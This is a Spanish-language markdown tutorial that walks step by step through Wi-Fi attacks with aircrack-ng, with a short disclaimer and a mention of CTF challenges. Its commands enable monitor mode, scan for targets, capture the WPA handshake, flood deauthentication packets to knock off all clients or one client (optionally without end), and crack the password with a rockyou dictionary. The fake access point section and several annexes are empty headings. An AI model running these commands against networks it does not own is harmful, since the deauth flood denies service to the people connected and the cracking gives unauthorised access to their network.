# Get off my wifi

**Contenido:**

+ Notas para banear a los usuarios no autorizados de tu red WIFI.
+ Notas para ataques de diccionario a una red WIFI con aircrack-ng
	+ Ataque a Router
	+ Ataque a cliente a través de un Fake Access Point
+ Notas para los retos WIFI en ctf.live

**Advertencia:** Este material es meramente educativo. Y claro, debe probarse únicamente con redes que nos pertenecen.

Si usted se encuentra en un ambiente gráfico es posible que pueda correr programas en paralelo desde diversos terminales. Sin embargo, si únicamente tiene una shell disponible tendrá que mirar el **Anexo 1: Comando jobs**

# Comandos aircrack-ng
El siguiente contenido está dividido en tres partes y nos permitirán realizar lo siguiente:
+ Deautenticar (Desconectar) a usuarios de la red WIFI
	+ Pasos 1-4, 6
+ Generar un ataque de diccionario para obtener la contraseña WIFI
	+ Pasos 1-7
+ Salir del modo monitor
	+ Paso 8

## 1) Mostrar las intefaces de red
Para interactuar con cualquier red WIFI es necesario tener una interfaz WIFI. (Esta necesariamente debe tener disponible el modo monitor). En Linux, contamos con diversos comandos para trabajar con nuestra interfaz de red. 

1.- A través de airmon 
```
sudo airmon-ng
```

2.- A través de iwconfig
```
iwconfig
```

Cualquiera de las dos nos mostrará información sobre nuestras interfaces de red. La primera columna corresponderá al nombre de interfaz y la usaremos más tarde. Para este ejemplo `wlan0`

## 2) Deshabilitar cualquier proceso que pueda interferir con la captura de paquetes
En ocasiones es posible que algún proceso esté utilizando nuestra interfaz de red y eso impida habilitar el modo monitor. Para evitar eso utilizamos:

```
sudo airmon-ng check kill
```

## 3) Habilitar el modo monitor de nuestra tarjeta de red
El modo monitor/promiscuo es un modo en que nuestra interfaz podrá escuchar el tráfico de red. Nuevamente, tenemos diversas formas de activar este modo.

Opción airmon-ng
```
sudo airmon-ng start <interfaz>
```
* En nuestro caso la interfaz es `wlan0` 

Opción iw
```
iw dev <interfaz> set monitor none
```

Opción ifconfig
```
ifconfig <interfaz> down
iw dev <interfaz> set monitor none
ifconfig <interfaz> up
```

Opción ifconfig 2
```
ifconfig <interfaz> down
iwconfig <interfaz>  mode monitor
ifconfig <interfaz>  up
```

Si volvemos a correr el paso uno podremos ver que nuestra interfaz de red ahora se encuentra en modo monitor bajo el nombre de `wlan0mon` ó `wlan0`. Lo anterior depende del modo en que se habilitó. 
* Es necesario corroborar el nombre de nuestra interfaz para trabajar con ella más tarde.

## 4) Listar las redes y clientes que existen a nuestro alrederor
Ahora, con ayuda de `airdump-ng` nosotros podremos observar las redes WIFI y clientes conectados a nuestro alrededor.

```
sudo airodump-ng <interfaz>
```
* En nuestro caso `<interfaz>` es `wlan0`
* ¿Qué significa la información que nos arroja? Ver **"Anexo 2: Listado de redes**"

Aquí es **importante** ubicar a nuestro objetivo a través de su **bssid** dependiendo de lo que queramos hacer:
+ Crackear la contraseña de una red WIFI 
+ Sacar a uno o a todos los clientes WIFI de una red.

Una vez obtenida la información paramos la ejecución con ``CTRL+C``

## 5) Capturamos el tráfico de la red
En el caso de que queramos obtener la contraseña de una red WIFI necesitaremos capturar el **handshake** intercambiado durante el establecimiento de la conexión entre el cliente y el router. Para esto, escucharemos todas las peticiones únicamente de nuestro objetivo (El router) y guardaremos en un archivo todo el tráfico intercambiado.

Este proceso debe ejecutarse hasta obtener el handshake (Forzamos esto en el paso 6). Tenemos dos opciones:
1. Dejar esto corriendo y abrir una nueva terminal para seguir con el tutorial
2. Correr esta tarea en segundo plano. (Anexo 1). 

Opción 1
```
sudo airodump-ng -c 1 --bssid 36:0A:98:80:97:C3 --write nombre_de_archivo <interfaz>
```
Opción 2
```
sudo airodump-ng -c 1 --bssid 36:0A:98:80:97:C3 --write nombre_de_archivo <interfaz> &
```
+ **-c** canal. En nuestro caso 1
+ **--bssid** bssid. En nuestro caso 36:0A:98:80:97:C3
+ **--write** nombre_de_archivo que guardará lo que capturamos
+ **interfaz** En nuestro caso wlan0

¿Qué es el **handshake**? ¿Acaso se envía la contraseña en texto claro? Ver **Anexo 3: Caputra del tráfico de red**

## 6) Ataque deauth

Deauthentication Attack es un ataque que nos permite expulsar a todos o a un solo cliente de la red WIFI.
Esto puede tener como objetivo:
+ Denegar el servicio a un solo cliente o a toda la red WIFI
+ Capturar el handshake que estamos buscando en el paso 5, para posteriormente hacer una ataque de fuerza bruta en busca de la clave.

#### Deautenticar a todos los clientes de un WIFI

```
sudo aireplay-ng -0 10 -a 36:0A:98:80:97:C3 <interfaz>
```

+ **-0** Se utiliza para el ataque deauth
+ **10** Es el número de paquetes deauth para ser enviados. Si seleccionas "0" lo hará de forma infinita.
+ **-a** Es la dirección MAC de la red WiFi objetivo
+ **Interfaz** En nuestro caso wlan0

#### Deautenticación a solamente un cliente de un WIFI

```
sudo aireplay-ng -0 10 -a 36:00:98:00:97:C3 -c 00:0A:FF:5F:FF:00 <interfaz>
```

+ **-0** Se utiliza para el ataque deauth
+ **10** Es el número de paquetes deauth para ser enviados. Si seleccionas "0" lo hará de forma infinita.
+ **-a** Es la dirección MAC de la red WiFi objetivo
+ **-c** Mac Address del cliente a deautenticar
+ **Interfaz** En nuestro caso wlan0

Después de lanzar el ataque deauth y conseguir el HANDSHAKE WPA, pulse `CTRL+C`. Para dejar de mandar el ataque Deauth. También finalice la captura de paquetes del paso 5.
+ Sí, solamente es `CTRL+C`
+ O en caso de haber utilizado tareas en segundo plano ver el Anexo 1

## 7) Ataque de diccionario para averiguar el password WIFI
Una vez que hemos obtenido nuestro handshake es tiempo de realizar un ataque de diccionario contra nuestro objetivo. 

```
sudo aircrack-ng nombre_archivo_captura.cap -w rockyou.txt
```
+ **nombre_archivo_captura.cap** es el que definimos en nuestro paso número 5.
+ **-w** Indica que se hará fuerza bruta a través de un diccionario, en nuestro caso utlizamos el diccionario `rockyou.txt`

Notas:
+ Si nos dice que no se encuentra el archivo *.cap hay que corroborar la ubicación y nombre de nuestro archivo
+ Si nos dice que no se ha encontrado un handshake es posible que no se haya capturado alguno. Recuerde que:
	+ Debe forzar la autenticación del cliente para lograr capturar el handshake
	+ Puede volver a probar a partir del paso número 4 para tratar de solucionar el error
+ Para obtener más información acerca de los diccionarios vea el **Anexo 4: Ataque de diccionario para averiguar el password WIFI**

## 8) Quitar el modo monitor y volver a utilizar nuestro WIFI
Una vez que hemos realizado nuestras labores querremos volver a utilizar nuestro WIFI de la forma habitual. Para esto tenemos las siguientes opciones.

Opción 1
1. Detenemos el modo monitor
2. Levantamos nuestra interfaz
3. Inciamos el servicio de red

```
sudo airmon-ng stop <interfaz>
sudo ifconfig wlan0 up
sudo systemctl start NetworkManager
```

Opción 2
```
ifconfig <interfaz> down
iwconfig <interfaz> mode managed
ifconfig <interfaz> up
```

# Creación de un Fake Access Point

# Anexo 1: Comando jobs

# Anexo 2: Listado de redes

+ **BSSID:** Mac Address de nuestro router (punto de acceso)
+ **PWR:** Nivel de señal 
+ **Beacons:** Número de “paquetes anucio” o beacons enviadas por el AP. 
	+ Cada punto de acceso envia alrededor de diez beacons por segundo cuando el rate o velocidad es de 1M, (la más baja) de tal forma que se pueden recibir desde muy lejos.
+ **#Data:** Número de paquetes de datos capturados.
	+ (si tiene clave WEP, equivale tambien al número de IVs), incluyendo paquetes de datos broadcast (dirigidos a todos los clientes).
+ **#/s:** Número de paquetes de datos capturados por segundo calculando la media de los últimos 10 segundos.
+ **CH:** Canal
+ **MB:** Velocidad máxima soportada por el AP. 
	+ Si MB = 11, es 802.11b, 
	+ Si MB = 22es 802.11b+ 
	+ Y velocidades mayores son 802.11g. 
	+ El punto (despues del 54) indica que esa red soporta un preámbulo corto o “short preamble”.
+ **ENC:** Algoritmo de encriptación que se usa. 
	+ OPN = no existe encriptación (abierta)
	+ “WEP?” = WEP u otra (no se han capturado suficientes paquetes de datos para saber si es WEP o WPA/WPA2), 
	+ WEP (sin el interrogante) indica WEP estática o dinámica, 
	+ WPA o WPA2 en el caso de que se use TKIP o CCMP.
+ **CIPHER:** Detector cipher. Puede ser CCMP, WRAP, TKIP, WEP, WEP40, o WEP104.
+ **AUTH:** El protocolo de autenticación usado. Puede ser: 
	+ MGT
	+ PSK (clave precompartida)
	+ OPN (abierta).
+ **ESSID**	Tambien llamado “SSID”
	+ Puede estar en blanco si la ocultación del SSID está activada en el AP. 
	+ En este caso, airodump-ng intentará averiguar el SSID analizando paquetes “probe responses” y “association requests” (son paquetes enviados desde un cliente al AP).

Justo debajo

+ **STATION:** Dirección MAC de cada cliente asociado. 
+ **Lost:** El número de paquetes perdidos en los últimos 10 segundos.
+ **Frames:** El número de paquetes de datos enviados por el cliente.
+ **Probes:** Los ESSIDs a los cuales ha intentado conectarse el cliente.	

# Anexo 3: Captura del tráfico de red

# Anexo 4: Ataque de diccionario para averiguar el password WIFI

# Información complementaria
+ <a href="https://medium.com/@Packt_Pub/the-deauthentication-attack-7872c916ed2a" target="_blank">the-deauthentication-attack</a>
+ <a href="https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142" target="_blank">Forcing a device to disconnect from WiFi using a deauthentication attack</a>
+ <a href="https://www.aircrack-ng.org/doku.php?id=deauthentication" target="_blank">Aircrack Deauthentication</a>
+ <a href="https://github.com/spacehuhn/esp8266_deauther" target="_blank">esp8266_deauther</a>
+ <a href="https://www.atareao.es/como/procesos-en-segundo-plano-en-linux/" target="_blank">PROCESOS EN SEGUNDO PLANO EN LINUX</a>
+ <a href="https://www.yeahhub.com/create-fake-ap-dnsmasq-hostapd-kali-linux/" target="_blank">Creando un Fake Access Point con hostapd</a>